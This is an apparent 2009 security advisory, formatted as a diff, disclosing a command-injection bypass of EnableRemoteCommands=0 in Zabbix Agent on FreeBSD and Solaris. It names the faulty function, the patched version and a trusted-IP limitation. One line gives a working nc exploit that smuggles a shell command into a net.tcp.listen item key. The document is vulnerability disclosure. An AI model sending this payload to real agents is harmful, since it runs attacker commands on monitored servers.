@@ -1,0 +1,22 @@
+Zabbix Agent : Bypass of EnableRemoteCommands=0 From: Nicob <nicob () nicob net>
+Date: Sun, 13 Dec 2009 16:28:30 +0100
+
+From Wikipedia : "Zabbix is a network management system application
+
+[...] designed to monitor and track the status of various network
+services, servers, and other network hardware."
+
+[Zabbix Agent : Bypass of EnableRemoteCommands=0]
+
+Impacted software : Zabbix Agent (FreeBSD and Solaris only)
+Zabbix reference : https://support.zabbix.com/browse/ZBX-1032
+Patched version : 1.6.7
+
+Faulty source code : function NET_TCP_LISTEN() in
+libs/zbxsysinfo/(freebsd|solaris)/net.c
+
+Exploit : $> echo "net.tcp.listen[80';id;echo ']"|nc -vn xxxxx 10050
+Limitation : attacker must come from (or spoof) a trusted IP address
+
+Changelog entry : fixed security vulnerability in processing of
+net.tcp.listen under FreeBSD and Solaris agents
